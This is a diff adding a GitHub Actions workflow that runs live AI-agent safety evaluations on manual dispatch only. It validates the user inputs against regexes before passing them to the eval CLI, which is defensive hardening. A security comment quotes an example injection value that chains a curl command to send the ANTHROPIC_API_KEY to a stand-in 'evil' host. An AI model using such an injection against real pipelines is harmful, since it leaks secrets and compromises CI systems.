@@ -1,0 +1,103 @@
+name: agent-evals (live)
+
+# workflow_dispatch ONLY — never push/pull_request. `eval:live` spends a real
+# ANTHROPIC_API_KEY against a real vendor model; it must never run
+# automatically on every push/PR the way `ci.yml`'s `evals` job (the hostile
+# corpus, no key needed) does. See docs/adr/0018 and packages/agent-evals's
+# README "Live" section for the full rationale — this file is the ONLY
+# enforcement of "never gates CI" on the workflow side; `cli.ts`'s own exit
+# code is still 1 on a safety violation (see that file's header), so
+# non-gating comes from this trigger, not from suppressing the exit code.
+on:
+  workflow_dispatch:
+    inputs:
+      k:
+        description: "Passes per scenario (overrides EVAL_LIVE_K, default 1)"
+        required: false
+        type: string
+      max_calls:
+        description: "Hard ceiling on real LLM calls (overrides MAX_LIVE_CALLS, default 100)"
+        required: false
+        type: string
+      category:
+        description: "Only run scenarios in this category (optional)"
+        required: false
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  eval-live:
+    name: eval:live
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+    steps:
+      - uses: actions/checkout@v7
+      - uses: pnpm/action-setup@v6
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 24
+          cache: pnpm
+      - run: pnpm install --frozen-lockfile
+      # No build step here, same as the hostile `evals` job in ci.yml:
+      # eval:live's own pre-script builds @apo/agent-orchestrator (only its
+      # dist is consumed) and the CLI itself runs from src via tsx.
+      #
+      # SECURITY: `inputs.*` are attacker-controlled (anyone who can dispatch
+      # this workflow chooses them) and this job's `env` holds a real
+      # ANTHROPIC_API_KEY. They are therefore NEVER interpolated into `run:`
+      # command text (that would be a shell-injection vector: e.g. a `k` of
+      # `1 && curl -d @- https://evil/ <<< $ANTHROPIC_API_KEY` would execute
+      # verbatim if spliced into the script). Instead each input is bound to
+      # a plain step-level env var below, validated with a shell regex BEFORE
+      # any use, and only ever expanded as a quoted "$VAR" — never concatenated
+      # into a string that could re-enter the shell as syntax.
+      - name: eval:live
+        env:
+          INPUT_K: ${{ inputs.k }}
+          INPUT_MAX_CALLS: ${{ inputs.max_calls }}
+          INPUT_CATEGORY: ${{ inputs.category }}
+        run: |
+          set -euo pipefail
+
+          args=()
+
+          if [[ -n "${INPUT_K}" ]]; then
+            if [[ ! "${INPUT_K}" =~ ^[0-9]+$ ]]; then
+              echo "eval:live: k must be a positive integer, got: ${INPUT_K}" >&2
+              exit 1
+            fi
+            args+=(--k "${INPUT_K}")
+          fi
+
+          if [[ -n "${INPUT_MAX_CALLS}" ]]; then
+            if [[ ! "${INPUT_MAX_CALLS}" =~ ^[0-9]+$ ]]; then
+              echo "eval:live: max_calls must be a positive integer, got: ${INPUT_MAX_CALLS}" >&2
+              exit 1
+            fi
+            args+=(--max-calls "${INPUT_MAX_CALLS}")
+          fi
+
+          if [[ -n "${INPUT_CATEGORY}" ]]; then
+            if [[ ! "${INPUT_CATEGORY}" =~ ^[a-zA-Z0-9_-]+$ ]]; then
+              echo "eval:live: category must be alphanumeric (with - or _), got: ${INPUT_CATEGORY}" >&2
+              exit 1
+            fi
+            args+=(--category "${INPUT_CATEGORY}")
+          fi
+
+          pnpm --filter @apo/agent-evals eval:live "${args[@]}"
+      # if: always() so the report of a run that hit a safety violation (exit
+      # 1) is still uploaded — exactly when someone needs to read it. This
+      # job's own exit code is deliberately NOT translated into a required
+      # check anywhere: workflow_dispatch-only (above) is what keeps this
+      # non-gating, not this step.
+      - uses: actions/upload-artifact@v7
+        if: always()
+        with:
+          name: agent-evals-live-report
+          path: packages/agent-evals/reports/
+          if-no-files-found: error
